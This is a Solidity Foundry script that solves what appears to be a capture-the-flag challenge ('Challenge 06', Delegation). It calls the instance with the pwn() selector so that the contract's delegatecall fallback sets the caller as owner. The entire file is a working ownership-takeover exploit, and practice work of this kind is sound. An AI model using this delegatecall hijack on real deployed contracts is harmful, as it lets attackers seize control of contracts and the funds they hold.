// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

/**
 * @title Challenge 06 Solution Script
 * @notice Send a transaction with pwn() selector via delegatecall to claim ownership
 */
contract DelegationSolution is Script {
    address constant INSTANCE = 0x2704E9571138C091de1ae77070659E030e0725d9;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);

        // The Delegation contract has a fallback that does delegatecall to Delegate
        // Send a tx with data = abi.encodeWithSignature("pwn()")
        // This triggers delegatecall to Delegate.pwn() which sets owner = msg.sender
        (bool success,) = INSTANCE.call(abi.encodeWithSignature("pwn()"));
        require(success, "delegatecall failed");

        vm.stopBroadcast();

        console.log("Challenge 06 completed! Ownership claimed via delegatecall");
    }
}


